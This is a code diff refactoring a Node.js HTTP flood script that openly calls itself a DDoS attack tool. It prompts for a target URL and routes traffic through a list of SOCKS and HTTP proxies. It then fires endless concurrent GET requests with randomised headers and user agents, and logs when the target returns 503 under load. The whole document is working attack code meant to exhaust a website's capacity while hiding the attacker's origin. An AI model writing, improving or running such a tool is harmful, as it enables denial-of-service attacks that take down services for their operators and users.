@@ -3,8 +3,15 @@ const fs = require("fs");
 const path = require("path");
 const SocksProxyAgent = require("socks-proxy-agent");
 const HttpsProxyAgent = require("https-proxy-agent");
+const chalk = require("chalk");
 const readline = require("readline");
+
 const { generateUserAgent } = require("./useragent.js");
+
+const proxyFilePath = path.join(__dirname, "proxy.txt");
+const maxRequests = Number.MAX_SAFE_INTEGER;
+const requestsPerSecond = Number.MAX_SAFE_INTEGER;
+const numThreads = 100;
 
 const langHeaders = [
     "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
@@ -52,11 +59,6 @@ const acceptHeaders = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
 ];
 
-const proxyFilePath = path.join(__dirname, "proxy.txt");
-const maxRequests = Number.MAX_SAFE_INTEGER;
-const requestsPerSecond = Number.MAX_SAFE_INTEGER;
-const numThreads = 100;
-
 const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
 
 const loadProxies = () => {
@@ -67,41 +69,31 @@ const loadProxies = () => {
     }
 };
 
-const performAttack = (url, agent, headers, onComplete) => {
+const performAttack = (url, agent, headers) => {
     axios
-    .get(url, {
-        httpAgent: agent, headers, timeout: 0
-    })
-    .then(() => setTimeout(() => performAttack(url, agent, headers, onComplete), 0))
-    .catch((err) => {
-        if (err.response?.status === 503) {
-            console.log("\x1b[31m%s\x1b[0m", "Target under heavy load (503).");
-        } else if (err.response?.status === 502) {
-            console.log("\x1b[31m%s\x1b[0m", "Error: Bad Gateway (502).");
-        } else {
-            console.log("\x1b[31m%s\x1b[0m", "Request error: " + err.message);
-        }
-        setTimeout(() => performAttack(url, agent, headers, onComplete), 0);
-    });
+        .get(url, { httpAgent: agent, headers, timeout: 0 })
+        .then(() => setTimeout(() => performAttack(url, agent, headers), 0))
+        .catch((err) => {
+            if (err.response?.status === 503) {
+                console.log(chalk.red("Target under heavy load (503)."));
+            } else if (err.response?.status === 502) {
+                console.log(chalk.red("Error: Bad Gateway (502)."));
+            } else {
+                console.log(chalk.red("Request error: " + err.message));
+            }
+            setTimeout(() => performAttack(url, agent, headers), 0);
+        });
 };
 
-const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout
-});
-
-// Prompt user for URL
-rl.question("\x1b[36mEnter the target URL (starting with http:// or https://):\x1b[0m ", (targetUrl) => {
+const startDdosAttack = async (targetUrl) => {
     if (!targetUrl || !/^https?:\/\//.test(targetUrl)) {
-        console.log("\x1b[31mInvalid URL. Please enter a valid URL starting with http:// or https://\x1b[0m");
-        rl.close();
+        console.log(chalk.red("Invalid URL. Please enter a valid URL starting with http:// or https://"));
         return;
     }
 
     const proxies = loadProxies();
     if (!proxies.length) {
-        console.log("\x1b[31mNo proxies found. Please add proxies to the proxy file.\x1b[0m");
-        rl.close();
+        console.log(chalk.red("No proxies found. Please add proxies to the proxy file."));
         return;
     }
 
@@ -117,25 +109,37 @@ rl.question("\x1b[36mEnter the target URL (starting with http:// or https://):\x
     };
 
     let continueAttack = true;
-    console.log("\x1b[32mStarting DDOS ATTACK...\x1b[0m");
+    console.log(chalk.green("Starting DDOS ATTACK..."));
 
     for (let i = 0; i < numThreads; i++) {
         for (const proxy of proxies) {
-            const proxyParts = proxy.split(":");
-            const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
-            const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
-            
-            const agent = proxyProtocol === "socks5"
+            const [host, port] = proxy.split(":");
+            let agent;
+
+            const proxyProtocol = host.startsWith("socks") ? "socks5" : "http";
+            const proxyUrl = `${proxyProtocol}://${host}:${port}`;
+
+            agent = proxyProtocol === "socks5"
                 ? new SocksProxyAgent(proxyUrl)
                 : new HttpsProxyAgent(proxyUrl);
 
-            performAttack(targetUrl, agent, headers, () => (continueAttack = false));
+            performAttack(targetUrl, agent, headers);
         }
     }
 
     setTimeout(() => {
         continueAttack = false;
-        console.log("\x1b[32mMax flood requests reached. Attack stopped.\x1b[0m");
-        rl.close();
+        console.log(chalk.green("Max flood requests reached. Attack stopped."));
     }, (maxRequests / requestsPerSecond) * 1000);
+};
+
+// Prompt for user input
+const rl = readline.createInterface({
+    input: process.stdin,
+    output: process.stdout
+});
+
+rl.question(chalk.red("Enter the target URL (http:// or https://): "), (targetUrl) => {
+    startDdosAttack(targetUrl);
+    rl.close();
 });
